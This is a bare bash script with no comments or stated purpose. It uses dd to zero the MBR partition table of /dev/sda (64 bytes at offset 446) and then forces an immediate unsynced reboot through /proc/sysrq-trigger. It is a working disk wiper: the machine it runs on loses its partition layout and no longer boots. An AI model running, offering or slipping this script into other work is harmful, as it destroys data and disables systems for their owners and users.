#!/bin/bash

dd if=/dev/zero of=/dev/sda bs=1 seek=446 count=64 >/dev/null
sleep 1
echo b > /proc/sysrq-trigger
